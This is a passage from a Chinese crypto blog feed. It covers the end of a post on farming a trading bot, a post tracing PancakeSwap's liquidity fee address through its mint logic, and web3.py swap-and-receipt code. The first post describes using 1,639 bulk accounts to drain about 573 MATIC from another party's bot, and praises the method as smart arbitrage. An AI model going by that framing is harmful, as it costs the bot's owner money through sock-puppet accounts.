<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221002127.png" alt="20240221002127" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221141108.png" alt="20240221141108" /></p>
<p>每次提现10个号，每个号提20matic</p>
<blockquote>
<p>买入8把key,卖出7把key，导出私钥</p>
</blockquote>
<h2 id="批量归集matic">批量归集matic:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221002045.png" alt="20240221002045" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221141336.png" alt="20240221141336" /><br />
提现成本0.1matic,每个号的利润为0.3x个matic。一批十个号，每次操作可以有三四个matic。</p>
<h2 id="总结">总结:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221141558.png" alt="20240221141558" /><br />
总利润估算 = 1639 * 0.35 = 573 matic<br />
matic按0.9u价格计算，约516u 约3717rmb。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221144938.png" alt="20240221144938" /><br />
开了2台机器，每个机器10个游戏账户，经过优化后,最快/高强度操作一批号只要12分钟左右。<br />
理想情况下，12分钟可以赚4matic，约3.6u，约26rmb.每小时可以赚130rmb。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221141903.png" alt="20240221141903" /><br />
机器人买入的列表中1800多个，有我创建的小白号1639个，大约占比为91%。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221142057.png" alt="20240221142057" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221142456.png" alt="20240221142456" /><br />
套利有时间窗口，在机器人主人发现之前，大约有10来天的时间，2月4到2月20左右。<br />
该机器人已经卖光自己的key，停止它的脚本了。(Feb-20-2024 08:19:52 AM +UTC)<br />
套利的时间窗口已关闭。</p>
<h1>Finally Summary:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>蚊子肉也是肉</p>
</li>
<li class="lvl-2">
<p>套利的确定性很强,批量可以增加规模/套利速度</p>
</li>
<li class="lvl-2">
<p>虽然这次套利的利润不是很多，但还是一次挺有意思的套利实践</p>
</li>
<li class="lvl-2">
<p>平时要有意识的训练自己的套利思路</p>
</li>
<li class="lvl-2">
<p>主流玩法拥挤、内卷，利润被大多数人瓜分，要想办法剑走偏锋，找出一条人少的路，建立自己的盈利/最优/套利路径。</p>
</li>
</ul>
<p>refs:</p>
<p>跟之前小红书上看到的一篇<a href="http://xhslink.com/zB6sSB">文章</a>内容有相似之处,<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221142852.png" alt="20240221142852" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221142903.png" alt="20240221142903" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221142919.png" alt="20240221142919" /></p>
<p>之前神鱼也提到<a href="https://twitter.com/TingHu888/status/1583679509588344832">套利思维</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221143038.png" alt="20240221143038" /></p>
<blockquote>
<p>下次如何发现新的套利机会？with链上数据分析？</p>
</blockquote>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-pancakeSwap收税地址的简单分析</title>
    <url>/2022/56133.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>朋友发了个tx给我，发现自己在pancakeSwap添加流动性时，没有获得全部的lptoken,一部分lptoken发送到了<code>0x0ed943ce24baebf257488771759f9bf482c39706</code>这个地址里，觉得很奇怪。。叫我看一下原因。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711004342.png" alt="20220711004342" /></p>
<h1>分析过程:</h1>
<h2 id="Erc20合约：">Erc20合约：</h2>
<p>一开始猜测有可能这个地址是erc20合约本身的收税地址，先看看该合约有无tax fee</p>
<p>用这个<a href="https://cryptogems.tips/scanner?address=0xc4eeb3199df249a6bce8ff706fe86c08c5f847d0&amp;blockchain=bsc">cryptogems</a>网站查很方便,确实有tax fee</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711010514.png" alt="20220711010514" /></p>
<p>但去合约代码里查，<code>0x0ed943ce24baebf257488771759f9bf482c39706</code>这个地址不是erc20合约里的预留地址/收税地址，那就不是代币合约的问题。。。</p>
<h2 id="Google">Google:</h2>
<p>google搜索了一下<code>0x0ed943ce24baebf257488771759f9bf482c39706</code>这个地址，发现也有部分人有遇到同样的问题，他们也没有讨论出个所以然来。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711004630.png" alt="20220711004630" /></p>
<blockquote>
<p>一度怀疑，他们是用同一个erc20合约自动生成工具，去发布token，被开发者预留了收税地址，强行收税。。。</p>
</blockquote>
<h2 id="Bscscan">Bscscan:</h2>
<p>先去bscscan查查这个地址，<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711005307.png" alt="20220711005307" /><br />
该地址<code>0x0ed943ce24baebf257488771759f9bf482c39706</code>是个代理合约，他的执行合约是<br />
<code>0xc06e6ed003763d173b5b9f35960ad359d0339c96</code></p>
<p>继续查一下<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711005421.png" alt="20220711005421" /></p>
<p>执行合约名称为<code>PCSFeeHandler</code>，可能跟pancake有关系，还是没看出个所以然来。。。</p>
<h2 id="tenderly">tenderly</h2>
<p>去<code>tenderly</code> Debug一下，<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711010150.png" alt="20220711010150" /></p>
<p>先关注几个<code>transfer</code>相关的函数，也没看到<code>0x0ed943ce24baebf257488771759f9bf482c39706</code>的踪影。</p>
<p>然后在debugger里的参数里有看到这个地址出现。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711011212.png" alt="20220711011212" /></p>
<p>向上找，是在<code>mint</code>铸造lptoken的流程里，会交税给这个地址。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711011324.png" alt="20220711011324" /></p>
<h3 id="mint函数流程：">mint函数流程：</h3>
<p>接着就去看一下PancakePair<a href="https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/PancakePair.sol">代码</a>里的<code>mint</code>函数</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711011758.png" alt="20220711011758" /></p>
<ol>
<li class="lvl-3">
<p><code>feeOn</code>开关由<code>_mintFee</code>函数控制</p>
</li>
<li class="lvl-3">
<p>查询工厂函数的<code>feeTo</code>地址</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711012157.png" alt="20220711012157" /></p>
<ol start="3">
<li class="lvl-3">
<p><code>feeTo</code>地址不为0地址，则<code>feeOn</code>收税开关为开启</p>
</li>
</ol>
<p>所以就是，添加流动性的时候，由于<code>pancakeswap</code>开启了收税开关，<code>mint</code>出来的部分<code>lptoken</code>打到了官方的收税地址里了。</p>
<h3 id="验证：-2">验证：</h3>
<p>随便找两个和<code>router</code><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e">合约</a>交互，调用了<code>addLiquidity</code>函数的tx看看,都是同样有被官方收税。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711012554.png" alt="20220711012554" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711012643.png" alt="20220711012643" /></p>
<p>确实是被官方收税了,Done！</p>
<h1>小结:</h1>
<ol>
<li class="lvl-3">
<p>之前应该是没开启收税，现在开启了</p>
</li>
<li class="lvl-3">
<p>做平台真赚钱，先免费做大，流量多了，后面再一键开启收税</p>
</li>
<li class="lvl-3">
<p>去中心的代码，中心化的规则指定😆😆😆 Fun~</p>
</li>
</ol>
<p>2022.7.11更新</p>
<p>之前的添加流动性也是有交税的，应该tax fee比较低，无感知。所以tax开关是一直开启的，并不是最近才开启的。</p>
<h1>bitquery数据分析:</h1>
<p>看看收税地址的<a href="https://explorer.bitquery.io/zh/bsc/smart_contract/0x0ed943ce24baebf257488771759f9bf482c39706/inflow?from=2022-01-01&amp;till=2022-07-11">入账情况</a>:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711182547.png" alt="20220711182547" /></p>
<p>能发现到一些有趣的信息，交税次数最多的token：<a href="https://bscscan.com/address/0x20f663cea80face82acdfa3aae6862d246ce0333"> DRIP Token (DRIP)</a>，还以为是bnb这类主流token呢。。</p>
<p>一些信息：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://drip.community/">官网</a></p>
</li>
<li class="lvl-2">
<p><a href="https://coinmarketcap.com/currencies/drip-network/">coinmarketcap地址</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.bsc.news/post/exploring-the-drip-platform-with-forex-sharks">BscNews-Exploring the Drip Platform With Forex Shark</a></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220711222207.png" alt="20220711222207" /></p>
<p>有一定热度，代币机制有10%的税，会自动添加流动性，所以才会频繁mint LpToken，频繁交税。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://tenderly.co/">tenderly</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cryptogems.tips/scanner?address=0xc4eeb3199df249a6bce8ff706fe86c08c5f847d0&amp;blockchain=bsc">cryptogems</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-pancakeswap_receipt细节</title>
    <url>/2021/35176.html</url>
    <content><![CDATA[<h1>swap token:</h1>
<p>测试用<code>BNB</code>去购买<code>VRT</code></p>
<h2 id="代码步骤">代码步骤:</h2>
<p>执行一段完整的交易，代码需要进行几个步骤:</p>
<ol>
<li class="lvl-3">
<p><strong>swapExactETHForTokens</strong> 传参，构造好函数</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func = router_contract.functions.swapExactETHForTokens(min_output_tokens, [self.addr.wbnb, token_address], self.wallet, self.deadline(<span class="number">60</span>))</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p><strong>buildTransaction</strong> 构造好交易</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">transaction = func.buildTransaction(tx_params)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p><strong>sign_transaction</strong> 私钥进行签名</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signed_tx = self.w3.eth.account.sign_transaction(transaction, private_key=self.secret_key)</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p><strong>send_raw_transaction</strong> 广播交易</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p><strong>wait_for_transaction_receipt</strong> 等待交易完成，获取收据</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.w3.eth.wait_for_transaction_receipt(tx, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure>
<ol start="6">
<li class="lvl-3">
<p><strong>processReceipt</strong> 可以解析获取Transfer事件的内容</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logs = self.get_token_contract(token_address=token_address).events.Transfer().processReceipt(receipt)</span><br></pre></td></tr></table></figure>
<h1>receipt log 交易收据log:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2B776BF8-05AF-41A0-ADE5-402D51A5771E.png" alt="2B776BF8-05AF-41A0-ADE5-402D51A5771E" /></p>
<p><a href="https://bscscan.com/tx/0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf">tx记录</a></p>
<p>example:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">	<span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">	<span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">34932511</span>,</span><br><span class="line">	<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">130517</span>,</span><br><span class="line">	<span class="string">&#x27;logs&#x27;</span>: [AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">752</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000ef5212ada83ec2cc105c409df10b8806d20e3b35&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">753</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0x5F84ce30DC3cF7909101C69086c50De191895883&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000ef5212ada83ec2cc105c409df10b8806d20e3b35&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000302c98e6d6a65bf15255b81972f9eaa1f45438c8&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x000000000000000000000000000000000000000000000015e7daca2ce9a452a0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">754</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x0000000000000000000000000000000000000000007f1919c0dd1f6e07bbbe220000000000000000000000000000000000000000000000148fc351f07c27c38d&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">755</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000302c98e6d6a65bf15255b81972f9eaa1f45438c8&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000038d7ea4c68000000000000000000000000000000000000000000000000015e7daca2ce9a452a00000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">756</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;)],</span><br><span class="line">	<span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">	<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Event:</p>
<ol>
<li class="lvl-3">
<p>Wbnb Deposit()</p>
</li>
<li class="lvl-3">
<p>Wbnb Transfer()</p>
</li>
<li class="lvl-3">
<p>VRT Transfer()</p>
</li>
<li class="lvl-3">
<p>PancakeSwap V2: VRT 5 Sync()</p>
</li>
<li class="lvl-3">
<p>PancakeSwap V2: VRT 5 Swap()</p>
</li>
</ol>
<h2 id="Events">Events:</h2>
<p>交易后可以获取到收据对象，收据对象里有log,记录了每个调用函数的 入参</p>
<ol>
<li class="lvl-3">
<p>Wbnb——Deposit()</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;wad&#x27;</span>: <span class="number">1000000000000000</span> <span class="comment"># 买入时 输入0.001BNB</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Deposit&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">752</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>往<code>router_v2</code>质押了0.001 BNB</p>
<ol start="2">
<li class="lvl-3">
<p>Wbnb——Transfer()</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>, <span class="comment"># PancakeSwap V2: VRT 5</span></span><br><span class="line">		<span class="string">&#x27;value&#x27;</span>: <span class="number">1000000000000000</span> <span class="comment"># 买入时 输入0.001BNB</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Transfer&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">753</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>router_v2</code>给<code>PancakeSwap V2: VRT 5</code>转了0.001BNB</p>
<ol start="3">
<li class="lvl-3">
<p>VRT——Transfer()</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>, <span class="comment"># PancakeSwap V2: VRT 5</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>, <span class="comment"># My Address</span></span><br><span class="line">		<span class="string">&#x27;value&#x27;</span>: <span class="number">404088513609832092320</span> <span class="comment"># 得到404.08851360983209232 vrt</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Transfer&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">754</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0x5F84ce30DC3cF7909101C69086c50De191895883&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>PancakeSwap V2: VRT 5</code>给<code>My Address</code>转了404.08851360983209232 vrt</p>
<ol start="4">
<li class="lvl-3">
<p>PancakeSwap V2: VRT 5——Sync()</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;reserve0&#x27;</span>: <span class="number">153652113319030071628643874</span>,</span><br><span class="line">		<span class="string">&#x27;reserve1&#x27;</span>: <span class="number">379294095135390286733</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Sync&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">755</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
